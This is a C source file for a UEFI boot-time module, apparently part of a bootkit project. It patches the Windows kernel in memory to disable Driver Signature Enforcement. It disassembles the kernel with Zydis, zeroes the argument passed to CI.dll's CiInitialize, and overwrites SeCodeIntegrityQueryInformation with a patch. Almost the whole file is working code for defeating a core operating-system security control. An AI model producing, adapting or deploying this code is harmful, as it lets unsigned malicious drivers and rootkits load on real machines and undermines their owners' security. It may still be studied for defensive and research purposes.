// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Protections Driver Signature Enforcement
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/MemoryAllocationLib.h
// Provides services to allocate and free memory buffers of various memory types and alignments. The Memory Allocation Library abstracts various common memory allocation operations. This library allows code to be written in a phase-independent manner because the allocation of memory in PEI, DXE, and SMM (for example) is done via a different mechanism. Using a common library interface makes it much easier to port algorithms from phase to phase.
#include <Library/MemoryAllocationLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/SynchronizationLib.h
// Provides synchronization functions.
#include <Library/SynchronizationLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/DevicePathLib.h
// Provides library functions to construct and parse UEFI Device Paths. This library provides defines, macros, and functions to help create and parse EFI_DEVICE_PATH_PROTOCOL structures.
#include <Library/DevicePathLib.h>



// START -> INCLUDES --------------------------------------------------------------------------------------------------------------------------
// START -> INCLUDES --------------------------------------------------------------------------------------------------------------------------



// https://github.com/zyantific/zydis
// Fast and lightweight x86/x86-64 disassembler and code generation library.
#include <Zydis/Zydis.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils05Pattern.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils08Tables.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils10Signatures.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Disables the Driver Signature Enforcement protection for the duration of the boot by preventing it from initializing.
	@details        This function takes a PE image represented by its ImageBase, NtHeaders, and PageSection, and disables the Driver Signature Enforcement protection. The Driver Signature Enforcement is a security feature that restricts the loading of unsigned or improperly signed drivers in Windows.
	@details        The actual heart of Code Integrity lies inside a single executable image, called CI.dll (you can find it inside your \Windows\system32 directory). If we take a look at the list of imported symbols, we will most likely see the following names: CiCheckSignedFile, CiFindPageHashesInCatalog, CiFindPageHashesInSignedFile, CiFreePolicyInfo, CiGetPEInformation, CiInitialize, CiVerifyHashInCatalog. The first function within our interest is the initialization routine, CI!CiInitialize. This routine is imported by the NT core (ntoskrnl.exe), and called during system initialization


	@param[in]      ImageBase                       The base address of the PE image.
	@param[in]      NtHeaders                       A pointer to the PE image's NT headers.
	@param[in]      PageSection                     A pointer to the section header of the PE image.
	@param[in]      BuildNumber                     The build number of the operating system.


	@retval         EFI_SUCCESS	                    The Driver Signature Enforcement protection was successfully disabled.
	@retval         EFI_UNSUPPORTED                 The function is not supported on the provided PE image.
	@retval         EFI_INVALID_PARAMETER           One or more of the input parameters are invalid.
	@retval         EFI_NOT_FOUND                   The required data or structures were not found in the PE image.
**/
EFI_STATUS
Protections_DisableDriverSignatureEnforcement(
	IN              UINT8*                          ImageBase,
	IN              PEFI_IMAGE_NT_HEADERS           NtHeaders,
	IN              PEFI_IMAGE_SECTION_HEADER       PageSection,
	IN              UINT16                          BuildNumber
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	CONST UINT32 PageSizeOfRawData = PageSection->SizeOfRawData;
	CONST UINT8* PageStartVa = ImageBase + PageSection->VirtualAddress;
	VOID* CiInitialize;


	// ---------------------------------------------------------------------------------------------------------------------
	// Find Import Address Table
	EFI_STATUS IatStatus = BootWindowsHookings_UtilsTables_FindImportAddressTable(ImageBase, NtHeaders, "CI.dll", "CiInitialize", &CiInitialize);

	// Failed
	if (EFI_ERROR(IatStatus))
	{
		return IatStatus;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Zydis variables
	ZyanStatus Status;
	ZydisDecoder Decoder;
	ZydisDecodedInstruction Instruction;
	ZydisDecodedOperand Operands[ZYDIS_MAX_OPERAND_COUNT];
	ZyanU64 InstructionAddress;
	UINTN Length = PageSizeOfRawData;
	UINTN Offset = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Zydis Decoder Initialization

	// https://doc.zydis.re/master/html/group__decoder#ga5448746153e38c32f81dcdc73f177002
	Status = ZydisDecoderInit(&Decoder, IMAGE64(NtHeaders) ? ZYDIS_MACHINE_MODE_LONG_64 : ZYDIS_MACHINE_MODE_LONG_COMPAT_32, IMAGE64(NtHeaders) ? ZYDIS_STACK_WIDTH_64 : ZYDIS_STACK_WIDTH_32); // https://github.com/zyantific/zydis/blob/15e38ac36fa4a84dde0fc6ae973d33c22e9521e9/src/Decoder.c#L4902

	// Failed
	if (!ZYAN_SUCCESS(Status))
	{
		return EFI_LOAD_ERROR;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Address of SepInitializeCodeIntegrityMovEcx and last MOV instruction into ECX
	UINT8* SepInitializeCodeIntegrityMovEcxAddress = NULL;
	UINT8* LastMovIntoEcx = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop to disassemble and process instructions

	// https://doc.zydis.re/master/html/group__decoder#ga12d3dd3cc08bac0cc816e7769b57ea5e
	while ((InstructionAddress = (ZyanU64)(PageStartVa + Offset), Status = ZydisDecoderDecodeFull(&Decoder, (VOID*)InstructionAddress, Length - Offset, &Instruction, Operands)) != ZYDIS_STATUS_NO_MORE_DATA)
	{

		// ZydisDecoderDecodeFull failed
		if (!ZYAN_SUCCESS(Status))
		{
			// Increment Offset and continue to next instruction
			Offset++;
			continue;
		}

		// mov ecx, <something>
		if (Instruction.operand_count == 2 && Instruction.length == 2 && Instruction.mnemonic == ZYDIS_MNEMONIC_MOV && Operands[0].type == ZYDIS_OPERAND_TYPE_REGISTER && Operands[0].reg.value == ZYDIS_REGISTER_ECX)
		{
			// Capturing the address of the instruction in memory.
			// 2-byte
			// 'mov ecx, <data or value being moved into the ECX register by the mov instruction>'
			LastMovIntoEcx = (UINT8*)InstructionAddress;
		}

		// JMP or CALL
		else if (((Instruction.operand_count == 2 || Instruction.operand_count == 4) && (Operands[0].type == ZYDIS_OPERAND_TYPE_MEMORY && Operands[0].mem.base == ZYDIS_REGISTER_RIP) && ((Instruction.mnemonic == ZYDIS_MNEMONIC_JMP && Instruction.operand_count == 2) || (Instruction.mnemonic == ZYDIS_MNEMONIC_CALL && Instruction.operand_count == 4))))
		{
			// Calculate absolute address of target operand and check if it matches the address of CiInitialize
			ZyanU64 OperandAddress = 0;

			// https://doc.zydis.re/master/html/group__utils#ga276fcfaf27a9ca02647be96d98879f65
			if (ZYAN_SUCCESS(ZydisCalcAbsoluteAddress(&Instruction, &Operands[0], InstructionAddress, &OperandAddress)) && OperandAddress == (UINTN)CiInitialize)
			{
				// Store the address of the 'mov ecx, <data ...>' instruction related to CiInitialize
				SepInitializeCodeIntegrityMovEcxAddress = LastMovIntoEcx;
				break;
			}
		}

		Offset += Instruction.length;
	}

	// Failed
	if (SepInitializeCodeIntegrityMovEcxAddress == NULL)
	{
		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Set ECX to Zero

	// The use of xor ecx, ecx is a common assembly instruction used to set the ECX register to zero. It is used as part of the patching process to achieve the desired functionality.
	CONST UINT16 ZeroEcx = 0xC931; // xor ecx, ecx (https://defuse.ca/online-x86-assembler.htm)
	BootWindowsHookings_UtilsMemory_CopyMemory(SepInitializeCodeIntegrityMovEcxAddress, &ZeroEcx, sizeof(ZeroEcx));


	// ---------------------------------------------------------------------------------------------------------------------
	// Find SeCodeIntegrityQueryInformation signature
	UINT8* Found = NULL;
	EFI_STATUS CiStatus = BootWindowsHookings_UtilsPattern_FindPattern(Global_BootWindowsHookings_SigSeCodeIntegrityQueryInformation, 0xCC, sizeof(Global_BootWindowsHookings_SigSeCodeIntegrityQueryInformation), (VOID*)PageStartVa, PageSizeOfRawData, (VOID**)&Found);

	// Failed
	if (EFI_ERROR(CiStatus))
	{
		return CiStatus;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Inject patch into located code pattern

	// Copies a source buffer to a destination buffer, and returns the destination buffer.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
	CopyMem(Found, Global_BootWindowsHookings_SeCodeIntegrityQueryInformationPatch, sizeof(Global_BootWindowsHookings_SeCodeIntegrityQueryInformationPatch));


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
